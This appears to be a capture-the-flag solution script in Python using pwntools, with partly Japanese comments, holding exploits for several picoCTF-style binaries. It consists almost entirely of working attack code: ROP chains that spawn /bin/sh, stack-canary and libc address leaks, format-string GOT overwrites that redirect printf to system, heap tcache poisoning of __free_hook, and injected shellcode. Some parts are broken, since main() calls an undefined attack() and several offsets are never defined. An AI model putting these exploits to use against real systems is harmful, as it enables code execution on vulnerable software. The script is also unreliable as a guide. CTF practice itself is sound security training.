#!/usr/bin/env python3
from pwn import *

bin_file = './chall_vulnfunc'
context( os = 'linux', arch = 'amd64' )
context( terminal = ['tmux', 'splitw', '-h'] )

binf = ELF( bin_file )

addr_main       = binf.functions['main'].address
addr_got_exit   = binf.got['exit']
addr_got_setbuf = binf.got['setbuf']

libc = binf.libc
offset_libc_setbuf = libc.functions['setbuf'].address
offset_libc_system = libc.functions['system'].address

info( f"binf.functions['main'].address={addr_main:#x}" )
info( f"binf.got['exit']={binf.got['exit']:#x}" )
info( f"binf.got['setbuf']={binf.got['setbuf']:#x}" )
info( f"libc.functions['setbuf'].address={libc.functions['setbuf'].address:#x}" )
info( f"libc.functions['system'].address={libc.functions['system'].address:#x}" )

if False: # for attack_stack_pivot()
    info( f"binf.bss()={binf.bss():#x}, binf.symbols['msg']={binf.symbols['msg']:#x}" )
    info( f"binf.functions['win'].address={binf.functions['win'].address:#x}" )

elif False: # for attack_sbof_leak_canary
    addr_win = binf.functions['win'].address

elif False: # for attack_stack()
    offset_main = binf.functions['main'].address

elif False: # for attack_aarw
    addr_got_atoi    = binf.got['atoi']                # 0x403470
    addr_got_exit    = binf.got['exit']                # 0x403480
    addr_main        = binf.functions['main'].address  # 0x4011b1
    
    libc = binf.libc
    offset_libc_atoi = libc.functions['atoi'].address  # 0x047730

elif False: # for attack_resolve
    addr_main          = binf.functions['main'].address
    addr_got_setbuf    = binf.got['setbuf']
    addr_got_scf       = binf.got['__stack_chk_fail']
    addr_bss           = binf.bss()
    
    libc = binf.libc
    offset_libc_setbuf = libc.functions['setbuf'].address

elif False: # for attack_fsb_twice
    info( f"binf.symbols['A']={binf.symbols['A']:#x}, binf.symbols['B']={binf.symbols['B']:#x}" )

elif False: # for attack_heap
    libc = binf.libc
    offset_libc_malloc_hook = libc.symbols['__malloc_hook']
    offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

def attack_stack_pivot( proc, **kwargs ):
    
    rop = ROP( binf )
    
    ropchain = b''
    ropchain += b'A' * 8                  # name
    ropchain += b'B' * 8                  # name
    ropchain += p64( binf.symbols['msg'] + 0xc0 - 8 ) # Saved RBP (0xc0 は win関数で使うスタック量を考慮)
    ropchain += p64( rop.leave.address )  # leave; ret;
    
    #info( proc.sendlineafter(b'>> ', ropchain[:-1]).decode() ) # なぜか、sendlineafter() ではうまくいかない
    info( proc.sendafter(b'>> ', ropchain[:-1]).decode() ) # fgets() は自動で、NULL終端するため、1byte手前まで送信する
    
    ropchain = b''
    ropchain += b'A' * 0xc0
    ropchain += p64( rop.rdi.address )    # pop rdi; ret;
    ropchain += p64( 0xcafebabe )         # key1
    ropchain += p64( rop.rsi.address )    # pop rsi; pop r15; ret;
    ropchain += p64( 0xc0bebeef )         # key2
    ropchain += p64( 0xdeadbeef )         # for r15 (何でもいい)
    ropchain += p64( binf.functions['win'].address ) # win()
    
    #info( proc.sendafter(b'>> ', ropchain).decode() ) # こちらは sendafter() ではうまくいかない
    info( proc.sendlineafter(b'>> ', ropchain).decode() )
    info( proc.recvall().decode() )

def attack_sbof_leak_canary( conn, **kwargs ):
    
    conn.sendafter('>> ', b'a'*0x18+b'!')
    conn.recvuntil('a!')
    canary = u64(b'\x00' + conn.recv(7))
    info('canary = 0x{:08x}'.format(canary))
    
    exploit  = b'a'*0x18
    exploit += p64(canary)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_win)
    conn.sendafter('>> ', exploit)

def attack_stack( conn, **kwargs ):
    
    conn.sendafter('>> ', b'a' * 0x18 + b'!')
    conn.recvuntil('a!')
    canary = unpack(b'\x00' + conn.recv(7))
    info('canary        = 0x{:08x}'.format(canary))
    
    conn.sendafter('>> ', b'b' * 0x3f + b'!')
    conn.recvuntil('b!')
    addr_stack = unpack(conn.recv(6), 'all') - 0x158
    info('addr_stack    = 0x{:08x}'.format(addr_stack))
    
    conn.sendafter('>> ', b'c' * 0x47 + b'!')
    conn.recvuntil('c!')
    addr_main    = unpack(conn.recv(6), 'all')
    binf.address = addr_main - offset_main # プログラムバイナリのベースアドレスをセット
    info('addr_bin_base = 0x{:08x}'.format(binf.address))
    
    rop = ROP(binf)
    
    exploit  = b'/bin/sh'.ljust(0x18, b'\x00')
    exploit += pack(canary)
    exploit += pack(0xdeadbeef)
    exploit += flat(rop.rdi.address, addr_stack)
    exploit += flat(rop.rsi.address, 0)
    exploit += flat(rop.rdx.address, 0)
    exploit += flat(rop.rax.address, constants.SYS_execve)
    exploit += pack(rop.syscall.address)
    conn.sendafter('>> ', exploit)

def attack_resolve_aarw( conn, **kwargs ):
    
    resolve_aarw_aaw(conn, addr_got_exit, addr_main) # GOT Overwrite
    
    addr_libc_atoi = resolve_aarw_aar(conn, addr_got_atoi)
    libc.address = addr_libc_atoi - offset_libc_atoi
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.functions['system'].address
    
    resolve_aarw_aaw(conn, addr_got_atoi, addr_libc_system)
    conn.sendlineafter('>> ', '/bin/sh\x00')

def resolve_aarw_aar( conn, addr ):
    
    conn.sendlineafter('>> ', '1')
    conn.sendlineafter('read >> ', hex(addr))
    conn.recvuntil(' : ')
    
    return int(conn.recvuntil('\n', drop=True), 16)

def resolve_aarw_aaw( conn, addr, val ):
    
    conn.sendlineafter('>> ', '2')
    conn.sendlineafter('write >> ', hex(addr))
    conn.sendlineafter('value >> ', hex(val))

def attack_resolve( conn, **kwargs ):
    
    rop = ROP(binf)
    rop.raw(rop.ret) # 16byteアライメントのため
    rop.printf(addr_got_setbuf)
    rop.raw(rop.ret) # 16byteアライメントのため
    rop.main()
    
    conn.sendlineafter('>> ', pack(0xdeadbeef) + bytes(rop))
    conn.sendlineafter('>> ', str(hex(addr_got_scf))) # 書き換え対象は__stack_chk_failのGOT
    conn.sendafter('>> ', str(hex(rop.r12_r13_r14_r15.address))) # RSPをROPガジェットの位置まで移動させるため
    conn.send(pack(0xcafebabe))
    
    addr_libc_setbuf    = unpack(conn.recv(6), 'all')
    libc.address = addr_libc_setbuf - offset_libc_setbuf
    info('addr_libc_base = 0x{:08x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))
    
    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.system(addr_libc_str_sh)
    
    conn.sendlineafter('>> ', bytes(rop))
    conn.sendlineafter('>> ', str(hex(addr_bss))) # 特に意味はないはず
    conn.sendlineafter('>> ', '0')                # 特に意味はないはず

def attack_fsb_aarw( proc, **kwargs ):
    
    if False:
        # AAAAAAAA が出現する位置を確認する
        proc.sendline( b'AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p' )
        info( proc.recv().decode() )
        
        exit()
    
    elif False:
        # 位置が正しいことを確認するため、アドレスを出力する
        proc.sendline( b'%9$p'.ljust(8, b' ') + p64(0x404020) )
        info( proc.recv().decode() )
        
        exit()
    
    else:
        # GOT (0x404020) の値を出力する
        proc.sendline( b'%9$s'.ljust(8, b' ') + p64(0x404020) )
        if False:
            ret = proc.recvregex( b'([0-9a-f]+)', capture=True )
            info( f"0x{int(ret.group(0).decode(), 16)}" )
            info( f"0x{int(ret.group(1).decode(), 16)}" )
            #info( f"0x{u64(ret.group(0))}" )
        elif False:
            info( f"0x{int(proc.recv().strip(), 16)}" )
        elif True:
            tmp = u64( proc.recv(6) + b'\x00\x00' )
            info( hex(tmp) )
        
        #info( proc.recv().decode() ) # エラーが出るため、decode() を削除

def attack_fsb_random( proc, **kwargs ):
    
    proc.sendline( b'%*7$c%10$n'.ljust(0x10, b' ') + p64(binf.symbols['key']) )
    info( proc.recvall() ) # エラーが出るため、decode() を削除

def attack_fsb_twice( proc, **kwargs ):
    
    #proc.sendline( b'%72c%8$hhn%118c%7$hhn' )
    proc.sendline( b'%c%c%c%c%c%c%66c%hhn%118c%7$hhn' )
    info( proc.recvall() )

def myrecv( proc, timeout=1 ):
    
    data = b""
    while True:
        chunk = proc.recv(timeout=timeout) # タイムアウトを設定
        if not chunk:
            break
        data += chunk
    return data

def attack_vulnfunc( conn, **kwargs ):
    
    overwrite = {addr_got_exit : addr_main}
    exploit = fmtstr_payload(6, overwrite, numbwritten = 0, write_size = 'short')
    conn.sendafter('message\n', exploit)
    
    conn.sendlineafter('message\n', '%3$p')
    addr_libc_read = int(conn.recvline(keepends=False), 16) - 0x12
    libc.address = addr_libc_read - offset_libc_read
    info('addr_libc_base = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.functions['system'].address
    
    exploit  = '%{}c'.format((addr_libc_system >> 16) & 0xff)
    exploit += '%10$hhn'
    exploit += '%{}c'.format((addr_libc_system & 0xffff) - ((addr_libc_system >> 16) & 0xff))
    exploit += '%11$hn'
    exploit  = exploit.ljust(0x20, 'x').encode()
    exploit += flat(addr_got_printf+2, addr_got_printf) # 10, 11
    conn.sendafter('message\n', exploit)
    conn.sendafter('message\n', '/bin/sh')

def attack_vulnfunc_mine( proc, **kwargs ):
    
    # GOT Overwrite
    # ・書式文字列攻撃で、exit関数のGOTにmain関数のアドレスを書き込む
    # ・No PIEなので、got['exit'](0x404038)に、main関数(0x4011b6)を書き込む
    # ・0x11(17)、0x40(64)-17=47、0xb6(182)-17-64=101
    # ・bufは48byteなので、3回に分けると入らない → 最初に0xb6(182)を書いて、次に0x1140(4416)を書く
    # ・GOTを確認すると、exit関数は実行前なので、0x401770になってた → 2byte書き込みでいい
    # ・0x11(17)、0xb6(182)-17=165
    info( proc.sendafter( b'Input message', b'%17c%10$hhn%165c%11$hhn'.ljust(0x20, b' ') + p64(binf.got['exit'] + 1) + p64(binf.got['exit']) ).decode() )
    
    # setbuf関数のアドレスをリーク
    info( proc.sendafter( b'Input message', b'%8$s'.ljust(0x10, b' ') + p64(binf.got['setbuf']) ) )
    proc.recv(1) # \n
    addr_libc_setbuf = u64( proc.recv(6) + b'\x00\x00' )
    addr_libc_base   = addr_libc_setbuf - offset_libc_setbuf
    addr_libc_system = addr_libc_base + offset_libc_system
    info( f"addr_libc_setbuf={addr_libc_setbuf:#x}, addr_libc_base={addr_libc_base:#x}, addr_libc_base={addr_libc_base:#x}, addr_libc_system={addr_libc_system:#x}" )
    
    # GOT Overwrite
    # ・書式文字列攻撃で、printf関数のGOTにsystem関数のアドレスを書き込む
    # ・ASLRでアドレスは変わるが、got['printf'](0x7236d82606f0)に、system関数(0x7236d8250d70)を書き込む
    # 下位3byteを書き換えるが、2byteの取り方で2通りあるが、値の小さい方を選ぶ
    # さらに、2byteの方が1byteより値が小さかった場合を考慮して分岐する
    tmp1 = (addr_libc_system >> 8) & 0x00FFFF
    tmp2 = addr_libc_system & 0x00FFFF
    if tmp1 > tmp2:
        tmp3 = (addr_libc_system >> 16) & 0x0000FF
        info( f"addr_libc_system: 1byte {tmp3:#x}, 2byte {tmp2:#x}" )
        if tmp2 > tmp3:
            atk = f"%{tmp3}c%10$hhn%{tmp2-tmp3}c%11$hn".encode()
            info( proc.sendafter( b'Input message', atk.ljust(0x20, b' ') + p64(binf.got['printf'] + 2) + p64(binf.got['printf']) ).decode() )
        else:
            atk = f"%{tmp2}c%10$hn%{tmp3-tmp2}c%11$hhn".encode()
            info( proc.sendafter( b'Input message', atk.ljust(0x20, b' ') + p64(binf.got['printf']) + p64(binf.got['printf'] + 2) ).decode() )
    else:
        tmp3 = addr_libc_system & 0x0000FF
        info( f"addr_libc_system: 2byte {tmp2:#x}, 1byte {tmp3:#x}" )
        if tmp2 > tmp3:
            atk = f"%{tmp3}c%10$hhn%{tmp2-tmp3}c%11$hn".encode()
            info( proc.sendafter( b'Input message', atk.ljust(0x20, b' ') + p64(binf.got['printf']) + p64(binf.got['printf'] + 1) ).decode() )
        else:
            atk = f"%{tmp2}c%10$hn%{tmp3-tmp2}c%11$hhn".encode()
            info( proc.sendafter( b'Input message', atk.ljust(0x20, b' ') + p64(binf.got['printf'] + 1) + p64(binf.got['printf']) ).decode() )
    
    info( proc.sendafter( b'Input message', b'/bin/sh' ) )

def attack_heap(conn, **kwargs):
    conn.sendlineafter('size', str(0x418))
    conn.sendlineafter('size', str(0x18))
    conn.sendlineafter('size', str(0x18))
    
    conn.sendlineafter('index >> ', '0')
    conn.recvuntil('content : ')
    addr_libc_mainarena = unpack(conn.recv(6), 'all') - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.functions['system'].address
    
    conn.sendlineafter('index >> ', '2')
    conn.sendline(pack(addr_libc_free_hook))
    
    conn.sendlineafter('size', str(0x18))
    conn.sendlineafter('content >> ', '/bin/sh\x00')
    conn.sendlineafter('size', str(0x18))
    conn.sendlineafter('content >> ', pack(addr_libc_system))

def attack_heap_mine( proc, **kwargs ):
    
    ofs_libc_mainarena = 0x1ebb80
    
    proc.sendlineafter( '>> ', f"{0x18}".encode() )  # to tcache
    proc.sendlineafter( '>> ', f"{0x418}".encode() ) # to unsortedbin
    proc.sendlineafter( '>> ', f"{0x18}".encode() )  # to tcache
    proc.sendlineafter( '>> ', b'1' )
    
    proc.recvuntil( 'content : ' )
    addr_libc_base = unpack(proc.recv(6), 'all') - 0x60 - ofs_libc_mainarena # fdメンバからlibc_baseを算出する
    info( f"addr_libc_base={addr_libc_base:#x}" )
    
    proc.sendlineafter( '>> ', b'2' )
    time.sleep( 1 )
    proc.sendline( p64(addr_libc_base + offset_libc_free_hook) )
    
    proc.sendlineafter( '>> ', f"{0x18}".encode() )  # from tcache
    proc.sendlineafter( '>> ', b'/bin/sh\x00' )
    proc.sendlineafter( '>> ', f"{0x18}".encode() )  # from tcache
    proc.sendlineafter( '>> ', p64(addr_libc_base + offset_libc_system) )
    
    #info( proc.recvall() )

def attack_handoff( proc, **kwargs ):
    
    shellcode  = asm(shellcraft.sh())
    somenop    = asm("nop") * (63 - len(shellcode))
    helpercode = asm("nop; sub rsp, 0x2e8; jmp rsp") + b'a' * 10 + p64(0x40116c)
    
    proc.sendlineafter( '3. Exit the app', b'1' )
    proc.sendlineafter( 'name: ', b'name' )
    
    proc.sendlineafter( '3. Exit the app', b'2' )
    proc.sendlineafter( 'send a message to?', b'0' )
    proc.sendlineafter( 'send them?', somenop + shellcode )
    
    proc.sendlineafter( '3. Exit the app', b'3' )
    proc.sendlineafter( 'really appreciate it: ', helpercode )
    
    #info( proc.recvall() )

def main():
    
    adrs = "shape-facility.picoctf.net"
    port = 51556
    #adrs = "localhost"
    #port = 4000
    
    #proc = gdb.debug( bin_file )
    proc = process( bin_file )
    #proc = remote( adrs, port )
    
    attack( proc )
    proc.interactive()

if __name__ == '__main__':
    main()
